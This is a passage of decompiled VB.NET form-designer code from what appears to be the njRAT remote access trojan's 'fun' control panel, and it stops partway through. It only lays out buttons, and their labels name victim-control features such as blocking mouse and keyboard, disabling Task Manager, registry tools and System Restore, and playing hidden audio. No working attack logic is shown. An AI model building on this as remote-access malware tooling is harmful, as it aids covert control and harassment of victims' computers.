﻿Namespace NJRAT
	' Token: 0x02000013 RID: 19
	<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
	Public Partial Class fun
		Inherits Global.System.Windows.Forms.Form

		' Token: 0x06000202 RID: 514 RVA: 0x00159B48 File Offset: 0x00157F48
		<Global.System.Diagnostics.DebuggerNonUserCode()>
		Protected Overrides Sub Dispose(disposing As Boolean)
			Try
				Dim flag As Boolean = disposing AndAlso Me.components IsNot Nothing
				If flag Then
					Me.components.Dispose()
				End If
			Finally
				MyBase.Dispose(disposing)
			End Try
		End Sub

		' Token: 0x06000203 RID: 515 RVA: 0x00159B98 File Offset: 0x00157F98
		<Global.System.Diagnostics.DebuggerStepThrough()>
		Private Sub InitializeComponent()
			Me.components = New Global.System.ComponentModel.Container()
			Dim componentResourceManager As Global.System.ComponentModel.ComponentResourceManager = New Global.System.ComponentModel.ComponentResourceManager(GetType(Global.NJRAT.fun))
			Me.ImageList1 = New Global.System.Windows.Forms.ImageList(Me.components)
			Me.GroupBox7 = New Global.System.Windows.Forms.GroupBox()
			Me.Button14 = New Global.System.Windows.Forms.Button()
			Me.Button15 = New Global.System.Windows.Forms.Button()
			Me.GroupBox2 = New Global.System.Windows.Forms.GroupBox()
			Me.Button3 = New Global.System.Windows.Forms.Button()
			Me.Button4 = New Global.System.Windows.Forms.Button()
			Me.GroupBox8 = New Global.System.Windows.Forms.GroupBox()
			Me.Button16 = New Global.System.Windows.Forms.Button()
			Me.Button17 = New Global.System.Windows.Forms.Button()
			Me.GroupBox6 = New Global.System.Windows.Forms.GroupBox()
			Me.Button22 = New Global.System.Windows.Forms.Button()
			Me.Button23 = New Global.System.Windows.Forms.Button()
			Me.GroupBox1 = New Global.System.Windows.Forms.GroupBox()
			Me.Button1 = New Global.System.Windows.Forms.Button()
			Me.Button2 = New Global.System.Windows.Forms.Button()
			Me.GroupBox10 = New Global.System.Windows.Forms.GroupBox()
			Me.Button19 = New Global.System.Windows.Forms.Button()
			Me.Button18 = New Global.System.Windows.Forms.Button()
			Me.GroupBox9 = New Global.System.Windows.Forms.GroupBox()
			Me.Button12 = New Global.System.Windows.Forms.Button()
			Me.Button13 = New Global.System.Windows.Forms.Button()
			Me.GroupBox11 = New Global.System.Windows.Forms.GroupBox()
			Me.Button21 = New Global.System.Windows.Forms.Button()
			Me.Button20 = New Global.System.Windows.Forms.Button()
			Me.GroupBox25 = New Global.System.Windows.Forms.GroupBox()
			Me.Button28 = New Global.System.Windows.Forms.Button()
			Me.Button29 = New Global.System.Windows.Forms.Button()
			Me.GroupBox19 = New Global.System.Windows.Forms.GroupBox()
			Me.Button37 = New Global.System.Windows.Forms.Button()
			Me.Button36 = New Global.System.Windows.Forms.Button()
			Me.TextBox4 = New Global.System.Windows.Forms.TextBox()
			Me.Button56 = New Global.System.Windows.Forms.Button()
			Me.GroupBox18 = New Global.System.Windows.Forms.GroupBox()
			Me.Button40 = New Global.System.Windows.Forms.Button()
			Me.Button41 = New Global.System.Windows.Forms.Button()
			Me.Button42 = New Global.System.Windows.Forms.Button()
			Me.Button43 = New Global.System.Windows.Forms.Button()
			Me.Button44 = New Global.System.Windows.Forms.Button()
			Me.Button45 = New Global.System.Windows.Forms.Button()
			Me.Button46 = New Global.System.Windows.Forms.Button()
			Me.Button47 = New Global.System.Windows.Forms.Button()
			Me.Button48 = New Global.System.Windows.Forms.Button()
			Me.Button49 = New Global.System.Windows.Forms.Button()
			Me.Button50 = New Global.System.Windows.Forms.Button()
			Me.Button51 = New Global.System.Windows.Forms.Button()
			Me.Button52 = New Global.System.Windows.Forms.Button()
			Me.Check_Sound = New Global.System.Windows.Forms.CheckBox()
			Me.GroupBox20 = New Global.System.Windows.Forms.GroupBox()
			Me.RadioButton10 = New Global.System.Windows.Forms.RadioButton()
			Me.RadioButton9 = New Global.System.Windows.Forms.RadioButton()
			Me.RadioButton8 = New Global.System.Windows.Forms.RadioButton()
			Me.RadioButton7 = New Global.System.Windows.Forms.RadioButton()
			Me.RadioButton6 = New Global.System.Windows.Forms.RadioButton()
			Me.RadioButton5 = New Global.System.Windows.Forms.RadioButton()
			Me.GroupBox22 = New Global.System.Windows.Forms.GroupBox()
			Me.RadioButton4 = New Global.System.Windows.Forms.RadioButton()
			Me.PictureBox4 = New Global.System.Windows.Forms.PictureBox()
			Me.RadioButton3 = New Global.System.Windows.Forms.RadioButton()
			Me.PictureBox3 = New Global.System.Windows.Forms.PictureBox()
			Me.RadioButton2 = New Global.System.Windows.Forms.RadioButton()
			Me.PictureBox2 = New Global.System.Windows.Forms.PictureBox()
			Me.RadioButton1 = New Global.System.Windows.Forms.RadioButton()
			Me.PictureBox1 = New Global.System.Windows.Forms.PictureBox()
			Me.GroupBox21 = New Global.System.Windows.Forms.GroupBox()
			Me.TextBox5 = New Global.System.Windows.Forms.TextBox()
			Me.TextBox6 = New Global.System.Windows.Forms.TextBox()
			Me.Button39 = New Global.System.Windows.Forms.Button()
			Me.Button38 = New Global.System.Windows.Forms.Button()
			Me.Panel1 = New Global.System.Windows.Forms.Panel()
			Me.Panel2 = New Global.System.Windows.Forms.Panel()
			Me.GroupBox16 = New Global.System.Windows.Forms.GroupBox()
			Me.Button34 = New Global.System.Windows.Forms.Button()
			Me.TextBox1 = New Global.System.Windows.Forms.TextBox()
			Me.GroupBox3 = New Global.System.Windows.Forms.GroupBox()
			Me.Button5 = New Global.System.Windows.Forms.Button()
			Me.Button6 = New Global.System.Windows.Forms.Button()
			Me.Button7 = New Global.System.Windows.Forms.Button()
			Me.Panel4 = New Global.System.Windows.Forms.Panel()
			Me.Button53 = New Global.System.Windows.Forms.Button()
			Me.Panel6 = New Global.System.Windows.Forms.Panel()
			Me.Button55 = New Global.System.Windows.Forms.Button()
			Me.Panel7 = New Global.System.Windows.Forms.Panel()
			Me.GroupBox7.SuspendLayout()
			Me.GroupBox2.SuspendLayout()
			Me.GroupBox8.SuspendLayout()
			Me.GroupBox6.SuspendLayout()
			Me.GroupBox1.SuspendLayout()
			Me.GroupBox10.SuspendLayout()
			Me.GroupBox9.SuspendLayout()
			Me.GroupBox11.SuspendLayout()
			Me.GroupBox25.SuspendLayout()
			Me.GroupBox19.SuspendLayout()
			Me.GroupBox18.SuspendLayout()
			Me.GroupBox20.SuspendLayout()
			Me.GroupBox22.SuspendLayout()
			CType(Me.PictureBox4, Global.System.ComponentModel.ISupportInitialize).BeginInit()
			CType(Me.PictureBox3, Global.System.ComponentModel.ISupportInitialize).BeginInit()
			CType(Me.PictureBox2, Global.System.ComponentModel.ISupportInitialize).BeginInit()
			CType(Me.PictureBox1, Global.System.ComponentModel.ISupportInitialize).BeginInit()
			Me.GroupBox21.SuspendLayout()
			Me.Panel1.SuspendLayout()
			Me.Panel2.SuspendLayout()
			Me.GroupBox16.SuspendLayout()
			Me.GroupBox3.SuspendLayout()
			Me.Panel4.SuspendLayout()
			Me.Panel6.SuspendLayout()
			Me.Panel7.SuspendLayout()
			Me.SuspendLayout()
			Me.ImageList1.ImageStream = CType(componentResourceManager.GetObject("ImageList1.ImageStream"), Global.System.Windows.Forms.ImageListStreamer)
			Me.ImageList1.TransparentColor = Global.System.Drawing.Color.Transparent
			Me.ImageList1.Images.SetKeyName(0, "fun.png")
			Me.ImageList1.Images.SetKeyName(1, "fun_manager.png")
			Me.ImageList1.Images.SetKeyName(2, "box_warning.png")
			Me.ImageList1.Images.SetKeyName(3, "clipboard.png")
			Me.ImageList1.Images.SetKeyName(4, "script_bat.png")
			Me.GroupBox7.Controls.Add(Me.Button14)
			Me.GroupBox7.Controls.Add(Me.Button15)
			Me.GroupBox7.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim groupBox As Global.System.Windows.Forms.Control = Me.GroupBox7
			Dim location As Global.System.Drawing.Point = New Global.System.Drawing.Point(420, 216)
			groupBox.Location = location
			Me.GroupBox7.Name = "GroupBox7"
			Dim groupBox2 As Global.System.Windows.Forms.Control = Me.GroupBox7
			Dim size As Global.System.Drawing.Size = New Global.System.Drawing.Size(203, 54)
			groupBox2.Size = size
			Me.GroupBox7.TabIndex = 12
			Me.GroupBox7.TabStop = False
			Me.GroupBox7.Text = "Monitor"
			Me.Button14.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button14.Image = CType(componentResourceManager.GetObject("Button14.Image"), Global.System.Drawing.Image)
			Dim button As Global.System.Windows.Forms.Control = Me.Button14
			location = New Global.System.Drawing.Point(110, 15)
			button.Location = location
			Me.Button14.Name = "Button14"
			Dim button2 As Global.System.Windows.Forms.Control = Me.Button14
			size = New Global.System.Drawing.Size(87, 32)
			button2.Size = size
			Me.Button14.TabIndex = 1
			Me.Button14.Text = "Turn on"
			Me.Button14.TextImageRelation = Global.System.Windows.Forms.TextImageRelation.ImageBeforeText
			Me.Button14.UseVisualStyleBackColor = True
			Me.Button15.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button15.Image = CType(componentResourceManager.GetObject("Button15.Image"), Global.System.Drawing.Image)
			Dim button3 As Global.System.Windows.Forms.Control = Me.Button15
			location = New Global.System.Drawing.Point(8, 15)
			button3.Location = location
			Me.Button15.Name = "Button15"
			Dim button4 As Global.System.Windows.Forms.Control = Me.Button15
			size = New Global.System.Drawing.Size(87, 32)
			button4.Size = size
			Me.Button15.TabIndex = 0
			Me.Button15.Text = "Turn off"
			Me.Button15.TextImageRelation = Global.System.Windows.Forms.TextImageRelation.ImageBeforeText
			Me.Button15.UseVisualStyleBackColor = True
			Me.GroupBox2.Controls.Add(Me.Button3)
			Me.GroupBox2.Controls.Add(Me.Button4)
			Me.GroupBox2.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim groupBox3 As Global.System.Windows.Forms.Control = Me.GroupBox2
			location = New Global.System.Drawing.Point(1, 270)
			groupBox3.Location = location
			Me.GroupBox2.Name = "GroupBox2"
			Dim groupBox4 As Global.System.Windows.Forms.Control = Me.GroupBox2
			size = New Global.System.Drawing.Size(203, 54)
			groupBox4.Size = size
			Me.GroupBox2.TabIndex = 8
			Me.GroupBox2.TabStop = False
			Me.GroupBox2.Text = "Mouse/Keyboard"
			Me.Button3.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button3.Image = CType(componentResourceManager.GetObject("Button3.Image"), Global.System.Drawing.Image)
			Dim button5 As Global.System.Windows.Forms.Control = Me.Button3
			location = New Global.System.Drawing.Point(8, 15)
			button5.Location = location
			Me.Button3.Name = "Button3"
			Dim button6 As Global.System.Windows.Forms.Control = Me.Button3
			size = New Global.System.Drawing.Size(87, 32)
			button6.Size = size
			Me.Button3.TabIndex = 4
			Me.Button3.Text = "Unblock"
			Me.Button3.TextImageRelation = Global.System.Windows.Forms.TextImageRelation.ImageBeforeText
			Me.Button3.UseVisualStyleBackColor = True
			Me.Button4.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button4.Image = CType(componentResourceManager.GetObject("Button4.Image"), Global.System.Drawing.Image)
			Dim button7 As Global.System.Windows.Forms.Control = Me.Button4
			location = New Global.System.Drawing.Point(108, 15)
			button7.Location = location
			Me.Button4.Name = "Button4"
			Dim button8 As Global.System.Windows.Forms.Control = Me.Button4
			size = New Global.System.Drawing.Size(87, 32)
			button8.Size = size
			Me.Button4.TabIndex = 5
			Me.Button4.Text = "Block"
			Me.Button4.TextImageRelation = Global.System.Windows.Forms.TextImageRelation.ImageBeforeText
			Me.Button4.UseVisualStyleBackColor = True
			Me.GroupBox8.Controls.Add(Me.Button16)
			Me.GroupBox8.Controls.Add(Me.Button17)
			Me.GroupBox8.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim groupBox5 As Global.System.Windows.Forms.Control = Me.GroupBox8
			location = New Global.System.Drawing.Point(420, 162)
			groupBox5.Location = location
			Me.GroupBox8.Name = "GroupBox8"
			Dim groupBox6 As Global.System.Windows.Forms.Control = Me.GroupBox8
			size = New Global.System.Drawing.Size(203, 54)
			groupBox6.Size = size
			Me.GroupBox8.TabIndex = 13
			Me.GroupBox8.TabStop = False
			Me.GroupBox8.Text = "Mouse"
			Me.Button16.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button16.Image = CType(componentResourceManager.GetObject("Button16.Image"), Global.System.Drawing.Image)
			Dim button9 As Global.System.Windows.Forms.Control = Me.Button16
			location = New Global.System.Drawing.Point(110, 15)
			button9.Location = location
			Me.Button16.Name = "Button16"
			Dim button10 As Global.System.Windows.Forms.Control = Me.Button16
			size = New Global.System.Drawing.Size(87, 32)
			button10.Size = size
			Me.Button16.TabIndex = 1
			Me.Button16.Text = "Normal"
			Me.Button16.TextImageRelation = Global.System.Windows.Forms.TextImageRelation.ImageBeforeText
			Me.Button16.UseVisualStyleBackColor = True
			Me.Button17.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button17.Image = CType(componentResourceManager.GetObject("Button17.Image"), Global.System.Drawing.Image)
			Dim button11 As Global.System.Windows.Forms.Control = Me.Button17
			location = New Global.System.Drawing.Point(7, 15)
			button11.Location = location
			Me.Button17.Name = "Button17"
			Dim button12 As Global.System.Windows.Forms.Control = Me.Button17
			size = New Global.System.Drawing.Size(87, 32)
			button12.Size = size
			Me.Button17.TabIndex = 0
			Me.Button17.Text = "Reverse"
			Me.Button17.TextImageRelation = Global.System.Windows.Forms.TextImageRelation.ImageBeforeText
			Me.Button17.UseVisualStyleBackColor = True
			Me.GroupBox6.Controls.Add(Me.Button22)
			Me.GroupBox6.Controls.Add(Me.Button23)
			Me.GroupBox6.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim groupBox7 As Global.System.Windows.Forms.Control = Me.GroupBox6
			location = New Global.System.Drawing.Point(211, 216)
			groupBox7.Location = location
			Me.GroupBox6.Name = "GroupBox6"
			Dim groupBox8 As Global.System.Windows.Forms.Control = Me.GroupBox6
			size = New Global.System.Drawing.Size(203, 54)
			groupBox8.Size = size
			Me.GroupBox6.TabIndex = 14
			Me.GroupBox6.TabStop = False
			Me.GroupBox6.Text = "Task Manager"
			Me.Button22.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button22.Image = CType(componentResourceManager.GetObject("Button22.Image"), Global.System.Drawing.Image)
			Dim button13 As Global.System.Windows.Forms.Control = Me.Button22
			location = New Global.System.Drawing.Point(110, 15)
			button13.Location = location
			Me.Button22.Name = "Button22"
			Dim button14 As Global.System.Windows.Forms.Control = Me.Button22
			size = New Global.System.Drawing.Size(87, 32)
			button14.Size = size
			Me.Button22.TabIndex = 10
			Me.Button22.Text = "Disable"
			Me.Button22.TextImageRelation = Global.System.Windows.Forms.TextImageRelation.ImageBeforeText
			Me.Button22.UseVisualStyleBackColor = True
			Me.Button23.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button23.Image = CType(componentResourceManager.GetObject("Button23.Image"), Global.System.Drawing.Image)
			Dim button15 As Global.System.Windows.Forms.Control = Me.Button23
			location = New Global.System.Drawing.Point(8, 15)
			button15.Location = location
			Me.Button23.Name = "Button23"
			Dim button16 As Global.System.Windows.Forms.Control = Me.Button23
			size = New Global.System.Drawing.Size(87, 32)
			button16.Size = size
			Me.Button23.TabIndex = 9
			Me.Button23.Text = "Enable"
			Me.Button23.TextImageRelation = Global.System.Windows.Forms.TextImageRelation.ImageBeforeText
			Me.Button23.UseVisualStyleBackColor = True
			Me.GroupBox1.Controls.Add(Me.Button1)
			Me.GroupBox1.Controls.Add(Me.Button2)
			Me.GroupBox1.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim groupBox9 As Global.System.Windows.Forms.Control = Me.GroupBox1
			location = New Global.System.Drawing.Point(1, 162)
			groupBox9.Location = location
			Me.GroupBox1.Name = "GroupBox1"
			Dim groupBox10 As Global.System.Windows.Forms.Control = Me.GroupBox1
			size = New Global.System.Drawing.Size(203, 54)
			groupBox10.Size = size
			Me.GroupBox1.TabIndex = 9
			Me.GroupBox1.TabStop = False
			Me.GroupBox1.Text = "CD-ROM"
			Me.Button1.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button1.Image = CType(componentResourceManager.GetObject("Button1.Image"), Global.System.Drawing.Image)
			Dim button17 As Global.System.Windows.Forms.Control = Me.Button1
			location = New Global.System.Drawing.Point(8, 15)
			button17.Location = location
			Me.Button1.Name = "Button1"
			Dim button18 As Global.System.Windows.Forms.Control = Me.Button1
			size = New Global.System.Drawing.Size(87, 32)
			button18.Size = size
			Me.Button1.TabIndex = 2
			Me.Button1.Text = "Open"
			Me.Button1.TextImageRelation = Global.System.Windows.Forms.TextImageRelation.ImageBeforeText
			Me.Button1.UseVisualStyleBackColor = True
			Me.Button2.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button2.Image = CType(componentResourceManager.GetObject("Button2.Image"), Global.System.Drawing.Image)
			Dim button19 As Global.System.Windows.Forms.Control = Me.Button2
			location = New Global.System.Drawing.Point(110, 15)
			button19.Location = location
			Me.Button2.Name = "Button2"
			Dim button20 As Global.System.Windows.Forms.Control = Me.Button2
			size = New Global.System.Drawing.Size(87, 32)
			button20.Size = size
			Me.Button2.TabIndex = 3
			Me.Button2.Text = "Close"
			Me.Button2.TextImageRelation = Global.System.Windows.Forms.TextImageRelation.ImageBeforeText
			Me.Button2.UseVisualStyleBackColor = True
			Me.GroupBox10.Controls.Add(Me.Button19)
			Me.GroupBox10.Controls.Add(Me.Button18)
			Me.GroupBox10.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim groupBox11 As Global.System.Windows.Forms.Control = Me.GroupBox10
			location = New Global.System.Drawing.Point(421, 270)
			groupBox11.Location = location
			Me.GroupBox10.Name = "GroupBox10"
			Dim groupBox12 As Global.System.Windows.Forms.Control = Me.GroupBox10
			size = New Global.System.Drawing.Size(203, 54)
			groupBox12.Size = size
			Me.GroupBox10.TabIndex = 16
			Me.GroupBox10.TabStop = False
			Me.GroupBox10.Text = "Registry"
			Me.Button19.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button19.Image = CType(componentResourceManager.GetObject("Button19.Image"), Global.System.Drawing.Image)
			Dim button21 As Global.System.Windows.Forms.Control = Me.Button19
			location = New Global.System.Drawing.Point(8, 15)
			button21.Location = location
			Me.Button19.Name = "Button19"
			Dim button22 As Global.System.Windows.Forms.Control = Me.Button19
			size = New Global.System.Drawing.Size(87, 32)
			button22.Size = size
			Me.Button19.TabIndex = 3
			Me.Button19.Text = "Enable"
			Me.Button19.TextImageRelation = Global.System.Windows.Forms.TextImageRelation.ImageBeforeText
			Me.Button19.UseVisualStyleBackColor = True
			Me.Button18.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button18.Image = CType(componentResourceManager.GetObject("Button18.Image"), Global.System.Drawing.Image)
			Dim button23 As Global.System.Windows.Forms.Control = Me.Button18
			location = New Global.System.Drawing.Point(110, 15)
			button23.Location = location
			Me.Button18.Name = "Button18"
			Dim button24 As Global.System.Windows.Forms.Control = Me.Button18
			size = New Global.System.Drawing.Size(87, 32)
			button24.Size = size
			Me.Button18.TabIndex = 4
			Me.Button18.Text = "Disable"
			Me.Button18.TextImageRelation = Global.System.Windows.Forms.TextImageRelation.ImageBeforeText
			Me.Button18.UseVisualStyleBackColor = True
			Me.GroupBox9.Controls.Add(Me.Button12)
			Me.GroupBox9.Controls.Add(Me.Button13)
			Me.GroupBox9.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim groupBox13 As Global.System.Windows.Forms.Control = Me.GroupBox9
			location = New Global.System.Drawing.Point(1, 216)
			groupBox13.Location = location
			Me.GroupBox9.Name = "GroupBox9"
			Dim groupBox14 As Global.System.Windows.Forms.Control = Me.GroupBox9
			size = New Global.System.Drawing.Size(203, 54)
			groupBox14.Size = size
			Me.GroupBox9.TabIndex = 16
			Me.GroupBox9.TabStop = False
			Me.GroupBox9.Text = "CMD"
			Me.Button12.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button12.Image = CType(componentResourceManager.GetObject("Button12.Image"), Global.System.Drawing.Image)
			Dim button25 As Global.System.Windows.Forms.Control = Me.Button12
			location = New Global.System.Drawing.Point(8, 15)
			button25.Location = location
			Me.Button12.Name = "Button12"
			Dim button26 As Global.System.Windows.Forms.Control = Me.Button12
			size = New Global.System.Drawing.Size(87, 32)
			button26.Size = size
			Me.Button12.TabIndex = 0
			Me.Button12.Text = "Enable"
			Me.Button12.TextImageRelation = Global.System.Windows.Forms.TextImageRelation.ImageBeforeText
			Me.Button12.UseVisualStyleBackColor = True
			Me.Button13.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button13.Image = CType(componentResourceManager.GetObject("Button13.Image"), Global.System.Drawing.Image)
			Dim button27 As Global.System.Windows.Forms.Control = Me.Button13
			location = New Global.System.Drawing.Point(108, 15)
			button27.Location = location
			Me.Button13.Name = "Button13"
			Dim button28 As Global.System.Windows.Forms.Control = Me.Button13
			size = New Global.System.Drawing.Size(87, 32)
			button28.Size = size
			Me.Button13.TabIndex = 1
			Me.Button13.Text = "Disable"
			Me.Button13.TextImageRelation = Global.System.Windows.Forms.TextImageRelation.ImageBeforeText
			Me.Button13.UseVisualStyleBackColor = True
			Me.GroupBox11.Controls.Add(Me.Button21)
			Me.GroupBox11.Controls.Add(Me.Button20)
			Me.GroupBox11.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim groupBox15 As Global.System.Windows.Forms.Control = Me.GroupBox11
			location = New Global.System.Drawing.Point(211, 270)
			groupBox15.Location = location
			Me.GroupBox11.Name = "GroupBox11"
			Dim groupBox16 As Global.System.Windows.Forms.Control = Me.GroupBox11
			size = New Global.System.Drawing.Size(203, 54)
			groupBox16.Size = size
			Me.GroupBox11.TabIndex = 16
			Me.GroupBox11.TabStop = False
			Me.GroupBox11.Text = "System Restore"
			Me.Button21.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button21.Image = CType(componentResourceManager.GetObject("Button21.Image"), Global.System.Drawing.Image)
			Dim button29 As Global.System.Windows.Forms.Control = Me.Button21
			location = New Global.System.Drawing.Point(8, 15)
			button29.Location = location
			Me.Button21.Name = "Button21"
			Dim button30 As Global.System.Windows.Forms.Control = Me.Button21
			size = New Global.System.Drawing.Size(87, 32)
			button30.Size = size
			Me.Button21.TabIndex = 6
			Me.Button21.Text = "Enable"
			Me.Button21.TextImageRelation = Global.System.Windows.Forms.TextImageRelation.ImageBeforeText
			Me.Button21.UseVisualStyleBackColor = True
			Me.Button20.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button20.Image = CType(componentResourceManager.GetObject("Button20.Image"), Global.System.Drawing.Image)
			Dim button31 As Global.System.Windows.Forms.Control = Me.Button20
			location = New Global.System.Drawing.Point(110, 15)
			button31.Location = location
			Me.Button20.Name = "Button20"
			Dim button32 As Global.System.Windows.Forms.Control = Me.Button20
			size = New Global.System.Drawing.Size(87, 32)
			button32.Size = size
			Me.Button20.TabIndex = 7
			Me.Button20.Text = "Disable"
			Me.Button20.TextImageRelation = Global.System.Windows.Forms.TextImageRelation.ImageBeforeText
			Me.Button20.UseVisualStyleBackColor = True
			Me.GroupBox25.Controls.Add(Me.Button28)
			Me.GroupBox25.Controls.Add(Me.Button29)
			Me.GroupBox25.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim groupBox17 As Global.System.Windows.Forms.Control = Me.GroupBox25
			location = New Global.System.Drawing.Point(211, 162)
			groupBox17.Location = location
			Me.GroupBox25.Name = "GroupBox25"
			Dim groupBox18 As Global.System.Windows.Forms.Control = Me.GroupBox25
			size = New Global.System.Drawing.Size(203, 54)
			groupBox18.Size = size
			Me.GroupBox25.TabIndex = 11
			Me.GroupBox25.TabStop = False
			Me.GroupBox25.Text = "Cursor"
			Me.Button28.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button28.Image = CType(componentResourceManager.GetObject("Button28.Image"), Global.System.Drawing.Image)
			Dim button33 As Global.System.Windows.Forms.Control = Me.Button28
			location = New Global.System.Drawing.Point(8, 15)
			button33.Location = location
			Me.Button28.Name = "Button28"
			Dim button34 As Global.System.Windows.Forms.Control = Me.Button28
			size = New Global.System.Drawing.Size(87, 32)
			button34.Size = size
			Me.Button28.TabIndex = 20
			Me.Button28.Text = "Hide"
			Me.Button28.TextImageRelation = Global.System.Windows.Forms.TextImageRelation.ImageBeforeText
			Me.Button28.UseVisualStyleBackColor = True
			Me.Button29.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button29.Image = CType(componentResourceManager.GetObject("Button29.Image"), Global.System.Drawing.Image)
			Dim button35 As Global.System.Windows.Forms.Control = Me.Button29
			location = New Global.System.Drawing.Point(108, 16)
			button35.Location = location
			Me.Button29.Name = "Button29"
			Dim button36 As Global.System.Windows.Forms.Control = Me.Button29
			size = New Global.System.Drawing.Size(87, 32)
			button36.Size = size
			Me.Button29.TabIndex = 21
			Me.Button29.Text = "Show"
			Me.Button29.TextImageRelation = Global.System.Windows.Forms.TextImageRelation.ImageBeforeText
			Me.Button29.UseVisualStyleBackColor = True
			Me.GroupBox19.Controls.Add(Me.Button37)
			Me.GroupBox19.Controls.Add(Me.Button36)
			Me.GroupBox19.Controls.Add(Me.TextBox4)
			Me.GroupBox19.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim groupBox19 As Global.System.Windows.Forms.Control = Me.GroupBox19
			location = New Global.System.Drawing.Point(352, 1)
			groupBox19.Location = location
			Me.GroupBox19.Name = "GroupBox19"
			Dim groupBox20 As Global.System.Windows.Forms.Control = Me.GroupBox19
			size = New Global.System.Drawing.Size(271, 66)
			groupBox20.Size = size
			Me.GroupBox19.TabIndex = 17
			Me.GroupBox19.TabStop = False
			Me.GroupBox19.Text = "Speak"
			Me.Button37.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Dim button37 As Global.System.Windows.Forms.Control = Me.Button37
			location = New Global.System.Drawing.Point(216, 35)
			button37.Location = location
			Me.Button37.Name = "Button37"
			Dim button38 As Global.System.Windows.Forms.Control = Me.Button37
			size = New Global.System.Drawing.Size(50, 25)
			button38.Size = size
			Me.Button37.TabIndex = 1
			Me.Button37.Text = "Test"
			Me.Button37.UseVisualStyleBackColor = True
			Me.Button36.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Dim button39 As Global.System.Windows.Forms.Control = Me.Button36
			location = New Global.System.Drawing.Point(216, 15)
			button39.Location = location
			Me.Button36.Name = "Button36"
			Dim button40 As Global.System.Windows.Forms.Control = Me.Button36
			size = New Global.System.Drawing.Size(50, 26)
			button40.Size = size
			Me.Button36.TabIndex = 1
			Me.Button36.Text = "Send"
			Me.Button36.UseVisualStyleBackColor = True
			Me.TextBox4.BackColor = Global.System.Drawing.Color.Black
			Me.TextBox4.BorderStyle = Global.System.Windows.Forms.BorderStyle.FixedSingle
			Me.TextBox4.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim textBox As Global.System.Windows.Forms.Control = Me.TextBox4
			location = New Global.System.Drawing.Point(7, 15)
			textBox.Location = location
			Me.TextBox4.Multiline = True
			Me.TextBox4.Name = "TextBox4"
			Dim textBox2 As Global.System.Windows.Forms.Control = Me.TextBox4
			size = New Global.System.Drawing.Size(203, 43)
			textBox2.Size = size
			Me.TextBox4.TabIndex = 0
			Me.Button56.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button56.Image = CType(componentResourceManager.GetObject("Button56.Image"), Global.System.Drawing.Image)
			Dim button41 As Global.System.Windows.Forms.Control = Me.Button56
			location = New Global.System.Drawing.Point(352, 131)
			button41.Location = location
			Me.Button56.Name = "Button56"
			Dim button42 As Global.System.Windows.Forms.Control = Me.Button56
			size = New Global.System.Drawing.Size(190, 25)
			button42.Size = size
			Me.Button56.TabIndex = 19
			Me.Button56.Text = "Play WAV Hidden"
			Me.Button56.TextImageRelation = Global.System.Windows.Forms.TextImageRelation.ImageBeforeText
			Me.Button56.UseVisualStyleBackColor = True
			Me.GroupBox18.Controls.Add(Me.Button40)
			Me.GroupBox18.Controls.Add(Me.Button41)
			Me.GroupBox18.Controls.Add(Me.Button42)
			Me.GroupBox18.Controls.Add(Me.Button43)
			Me.GroupBox18.Controls.Add(Me.Button44)
			Me.GroupBox18.Controls.Add(Me.Button45)
			Me.GroupBox18.Controls.Add(Me.Button46)
			Me.GroupBox18.Controls.Add(Me.Button47)
			Me.GroupBox18.Controls.Add(Me.Button48)
			Me.GroupBox18.Controls.Add(Me.Button49)
			Me.GroupBox18.Controls.Add(Me.Button50)
			Me.GroupBox18.Controls.Add(Me.Button51)
			Me.GroupBox18.Controls.Add(Me.Button52)
			Me.GroupBox18.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim groupBox21 As Global.System.Windows.Forms.Control = Me.GroupBox18
			location = New Global.System.Drawing.Point(84, 1)
			groupBox21.Location = location
			Me.GroupBox18.Name = "GroupBox18"
			Dim groupBox22 As Global.System.Windows.Forms.Control = Me.GroupBox18
			size = New Global.System.Drawing.Size(262, 155)
			groupBox22.Size = size
			Me.GroupBox18.TabIndex = 21
			Me.GroupBox18.TabStop = False
			Me.GroupBox18.Text = "Piano"
			Me.Button40.BackColor = Global.System.Drawing.Color.Black
			Me.Button40.FlatStyle = Global.System.Windows.Forms.FlatStyle.Flat
			Me.Button40.ForeColor = Global.System.Drawing.Color.Black
			Dim button43 As Global.System.Windows.Forms.Control = Me.Button40
			location = New Global.System.Drawing.Point(184, 15)
			button43.Location = location
			Me.Button40.Name = "Button40"
			Dim button44 As Global.System.Windows.Forms.Control = Me.Button40
			size = New Global.System.Drawing.Size(20, 91)
			button44.Size = size
			Me.Button40.TabIndex = 26
